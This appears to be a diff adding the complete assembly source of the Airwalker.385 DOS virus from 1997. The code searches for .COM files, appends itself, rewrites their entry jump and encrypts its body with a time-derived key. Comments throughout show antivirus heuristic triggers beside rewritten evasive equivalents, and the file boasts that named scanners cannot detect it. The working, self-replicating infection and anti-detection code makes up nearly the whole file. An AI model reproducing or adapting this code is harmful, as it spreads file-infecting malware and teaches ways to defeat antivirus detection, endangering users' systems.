@@ -1,0 +1,314 @@
+; ===========================================================================
+; The Airwalker.385 Virus                          Written by Gothmog/[DHA97]
+; ===========================================================================
+;
+; Assumes TASM v4.00 or v5.00 or A86 Macro Assembler v4.02;  other assemblers
+; may work, but are not personally tested or quality assured.
+;
+; Assemble with: tasm /m2 airw-385.asm     (/m1 generates a 386 byte variant)
+;                tlink /t airw-385.obj
+;
+; Alternately:   a86 airw-385.asm airw-385.com   (creates a 384 byte variant)
+;
+; Payload: On each run, before returning control to the host program, the key
+;          contained at encrypt_key will be compared with a random byte taken
+;          from I/O port 40h (system timer). If the low bytes match, the host
+;          program will beep once, then continue normally.  If the high bytes
+;          match, the virus will display its message from the SLAM virus team
+;          and transfer control to the host.
+;
+; As of right now, the Airwalker.385 virus is 100% unscannable with:
+;
+;  þ TBAV v7.07 w/ high heuristic sensitivity enabled
+;  þ F-PROT v2.26 w/ switches /ANALYSE /GURU /PARANOID enabled
+;  þ AVPLite v3.0 build 107 updated 03/22/97 with full heuristics enabled
+;  þ Dr. Solomon's FindVirus v7.69 w/ the following command-line switches
+;    enabled: /!GURU /SECURE /VID /!IVN /!DOBOOTS /PACK /ANALYSE
+;  þ Microsoft Anti-Virus (big surprise... no great accomplishment here :)
+
+.model tiny
+.286
+.code
+
+	org	0100h
+
+start:
+        db      0E9h
+        dw      offset virus_start - offset dummy_host
+
+dummy_host:          
+        mov     ah, 09h
+        int     21h
+        int     20h
+
+message         db      'WARNING: You have just released the Airwalker.385 virus!', 0Dh, 0Ah, '$'
+
+virus_start:
+                db      0BDh
+delta_offset:
+                dw      offset virus_start
+
+; ===========================================================================
+; F-Protect will flag this virus if the following code is included, but stops
+; tracing immediately if a register is called, even if the /analyse /paranoid
+; and /guru command-line switches are used.
+;
+;       call    decrypt
+; ===========================================================================
+
+        lea     ax, [bp + decrypt - virus_start]
+        call    ax
+
+start_encrypt:
+
+; ===========================================================================
+; AVP v3.0 build 107 update 03/22/97 will detect the following anti-heuristic
+; code segment, but not if you xor a word on the stack:
+;
+;       xor     word ptr [bp + file_mask + 2 - virus_start], 1717h
+;       xor     byte ptr [bp + file_mask + 4 - virus_start], 19h
+; ===========================================================================
+
+        push    word ptr [bp + file_mask + 2 - virus_start]
+        mov     bx, sp
+        xor     word ptr [bx], 1717h
+        pop     word ptr [bp + file_mask + 2 - virus_start]
+        xor     byte ptr [bp + file_mask + 4 - virus_start], 19h
+
+; ===========================================================================
+; O  Found code that can be used to overwrite/move a program in memory.
+;
+;       mov     di, 0100h
+;       lea     si, [bp + original - virus_start]
+; ===========================================================================
+
+        mov     si, 0100h
+        lea     di, [bp + original - virus_start]
+        xchg    si, di
+
+        movsw
+        movsb
+
+        mov     ah, 1Ah
+        lea     dx, [bp + virus_dta - virus_start]
+        int     21h
+
+; ===========================================================================
+; F  Suspicious file access.  Might be able to infect a file.
+;
+;       mov     ah, 4Eh
+;       lea     dx, [bp + file_mask - virus_start]
+;       mov     cx, 32
+;       int     21h
+; ===========================================================================
+
+        mov     bh, 4Eh
+        xchg    ax, bx
+        lea     dx, [bp + file_mask - virus_start]
+        mov     cx, 32
+        int     21h
+
+        jnc     open_again
+
+return_to_host:
+
+        mov     ax, word ptr [bp + encrypt_key - virus_start]
+        xchg    al, bl
+        in      al, 40h
+
+        cmp     al, ah
+        je      payload_beep
+
+        cmp     al, bl
+        jne     back_to_entry
+
+payload_slam_message:
+        lea     dx, [bp + slam_string - virus_start]
+        jmp     display_string
+
+payload_beep:
+        lea     dx, [bp + beep_string - virus_start]
+
+display_string:
+        mov     ah, 09h
+        int     21h
+
+back_to_entry:
+
+; ===========================================================================
+; B  Back to entry point.  Contains code to re-start the program after
+;    modifications at the entry-point are made.  Very usual for viruses.
+;
+;       mov     si, 0100h
+;       push    si
+;       ret
+; ===========================================================================
+
+        dec     sp
+        mov     si, sp
+        mov     word ptr [si], 0100h
+        xor     ax, ax
+        xor     bx, bx
+        xor     cx, cx
+        cwd
+        xor     bp, bp
+        xor     si, si
+        xor     di, di
+        ret
+
+open_again:
+        mov     ax, 3D02h
+        lea     dx, [bp + name_buffer - virus_start]
+	int	21h
+        jc      return_to_host
+
+        xchg    bx, ax
+
+        mov     ah, 3Fh
+        lea     dx, [bp + original - virus_start]
+        mov     cx, 03h
+	int	21h
+
+        jc      return_to_host
+	push	bx
+        mov     bx, dx
+        cmp     byte ptr [bx], 0E9h
+        pop     bx
+
+        je      find_next_file
+
+        mov     ax, 4202h
+        xor     cx, cx
+        cwd
+        int     21h
+        jc      return_to_host
+
+	push	ax
+
+        add     ax, offset start
+        mov     word ptr [bp + delta_offset - virus_start], ax
+
+        mov     ah, 2Ch
+        int     21h
+        xchg    ch, cl
+        add     dx, cx
+        mov     word ptr [bp + encrypt_key - virus_start], dx
+
+        xor     word ptr [bp + file_mask + 2 - virus_start], 1717h
+        xor     byte ptr [bp + file_mask + 4 - virus_start], 19h
+
+        mov     ah, 40h
+        mov     cx, virus_end - virus_start
+        lea     dx, [bp + virus_start - virus_start]
+
+        pusha
+        jmp     write_virus
+
+out_write_virus:
+	pop	ax
+        jc      jump_up
+
+        sub     ax, 03h
+        push    bx
+        mov     bx, bp
+        mov     word ptr cs:[bx + 1], ax
+        mov     byte ptr [bx], 0E9h
+
+	pop	bx
+
+        mov     ax, 4200h
+        xor     cx, cx
+        cwd
+	int	21h
+        jc      jump_up
+
+; ===========================================================================
+; F  Suspicious file access.  Might be able to infect a file.
+;
+;        mov     ah, 40h
+;        lea     dx, [bp + virus_start - virus_start]
+;        mov     cx, 03h
+;        int     21h
+;        jc      return_to_host
+; ===========================================================================
+
+        mov     ax, 03h
+        mov     ch, 40h
+        lea     dx, [bp + virus_start - virus_start]
+        xchg    ax, cx
+        int     21h
+        jc      jump_up
+
+        mov     ah, 3Eh
+        int     21h
+
+jump_up:
+        jmp     return_to_host
+
+find_next_file:
+        mov     ah, 3Eh
+        int     21h
+	
+        lea     dx, [bp + file_mask - virus_start]
+        mov     ah, 4Fh
+	int	21h
+        jc      jump_up
+        jmp     open_again
+
+original:
+        mov     dx, offset message
+
+virus_name      db      '[airwalker]', 00h
+virus_author    db      '(c) 1997 gothmog', 00h
+
+beep_string     db      07h, '$'
+slam_string     db      'greetings to the world from the slam virus team', 0Dh, 0Ah, '$'
+
+; ===========================================================================
+; S  Contains a routine to search for executable (.COM or .EXE) files.
+;
+; file_mask     db      '*.com', 00h
+; ===========================================================================
+
+file_mask       db      '*.txt', 00h
+
+end_encrypt     equ     $ - 0001h
+
+encrypt:
+decrypt:
+        lea     si, [bp + start_encrypt - virus_start]
+        mov     di, si
+        mov     cx, (end_encrypt - start_encrypt + 1) / 2
+
+xor_loop:
+        lodsw
+        int     03h                                           ; debugger trap
+        jnc     false_jump
+
+false_jump_2:
+        stosw
+        loop    xor_loop
+        ret
+
+false_jump:
+        db      35h
+
+encrypt_key             dw      0000
+
+        jnc     false_jump_2
+
+write_virus:
+        call    encrypt
+        popa
+        int     21h
+        call    decrypt
+        jmp     out_write_virus
+
+virus_end:
+
+virus_dta       db      30 dup (?)
+name_buffer     db      13 dup (?)
+
+        end     start
+
+; ============================================================[ code ends ]==
